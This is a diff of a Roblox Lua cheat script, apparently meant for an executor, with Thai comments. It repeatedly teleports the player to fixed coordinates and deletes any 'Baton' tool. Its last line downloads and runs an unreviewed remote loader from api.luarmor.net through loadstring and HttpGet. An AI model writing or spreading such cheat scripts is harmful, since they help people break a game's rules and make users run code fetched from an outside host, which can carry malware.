@@ -1,7 +1,7 @@
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
--- ✅ ตำแหน่งเป้าหมายในการเทเลพอร์ต
+-- ✅ เป้าหมาย CFrame ที่จะเทเลพอร์ตไป
 local targetCFrame = CFrame.new(
     -2.87504387, -591.993408, -25.5160141, 
     -0.747889876, 0, 0.663823009, 
@@ -9,7 +9,7 @@ local targetCFrame = CFrame.new(
     -0.663823009, 0, -0.747889876
 )
 
--- ✅ ฟังก์ชันรอให้ character พร้อม
+-- ✅ รอให้ character พร้อมก่อนใช้งาน
 local function waitForCharacter()
     if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
         lp.CharacterAdded:Wait()
@@ -18,27 +18,39 @@ local function waitForCharacter()
     return lp.Character:FindFirstChild("HumanoidRootPart")
 end
 
--- ✅ ลูปเทเลพอร์ต (รันแยก thread)
+-- ✅ ลูปเทเลพอร์ตทุกวินาที
 task.spawn(function()
     while true do
         local hrp = waitForCharacter()
         hrp.CFrame = targetCFrame
-        wait(1)  -- เปลี่ยนค่าได้ เช่น wait(0.5)
+        task.wait(1)
     end
 end)
 
--- ✅ ลูปลบ Tool ใน Backpack (รันแยก thread)
+-- ✅ ลูปลบ "Baton" จาก Backpack และ Character ตลอดเวลา
 task.spawn(function()
     while true do
-        for _, tool in pairs(lp.Backpack:GetChildren()) do
-            if tool:IsA("Tool") then
-                print("Tool removed: " .. tool.Name)
-                tool:Destroy()
+        -- ลบจาก Backpack
+        for _, item in pairs(lp.Backpack:GetChildren()) do
+            if item:IsA("Tool") and item.Name == "Baton" then
+                print("Removed Baton from Backpack")
+                item:Destroy()
             end
         end
-        wait(1)  -- ปรับความเร็วได้
+
+        -- ลบจาก Character (กรณีถืออยู่)
+        if lp.Character then
+            for _, item in pairs(lp.Character:GetChildren()) do
+                if item:IsA("Tool") and item.Name == "Baton" then
+                    print("Removed Baton from Character")
+                    item:Destroy()
+                end
+            end
+        end
+
+        task.wait(0.5)
     end
 end)
 
--- ✅ โหลดสคริปต์จากภายนอก (ระวังความปลอดภัยเสมอ!)
+-- ✅ โหลดสคริปต์จากภายนอก (ใช้ใน executor เท่านั้น)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/666b9548b0e322722491428b44de9541.lua"))()
